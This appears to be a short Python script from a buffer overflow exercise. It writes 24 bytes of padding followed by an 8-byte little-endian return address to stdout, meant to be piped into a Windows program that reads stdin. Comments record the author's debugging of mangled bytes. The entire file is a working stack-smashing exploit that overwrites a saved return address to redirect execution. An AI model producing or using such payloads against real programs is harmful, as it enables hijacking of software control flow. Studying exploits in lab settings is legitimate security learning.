import sys
#0x00007FF7E1FC14A4
#00 00 7F F7 E1 FC 14 A4 little endian format for the stack
#42 41 7f 3f 3f 3f 13 3f outcome, 3f=?=unknown char, perhaps from copy paste into debugger run input idk
#   not sure why the 13!=14, 7f=127 and the last 2 bytes work fine
junk = [ord('A')]*8 + [ord('B')]*8 +[ord('C')]*8
#junk = [0]*24
addr = [0xa4, 0x14, 0xfc, 0xe1, 0xf7, 0x7f, 0x0, 0x0]
#addr = [0x41, 0x42, 0x43, 0x44, 0x45, 0x7f, 0x0, 0x0]
payload = bytes(junk + addr)

sys.stdout.buffer.write(payload)
# python stdout_payload.py | program_reading_stdin.exe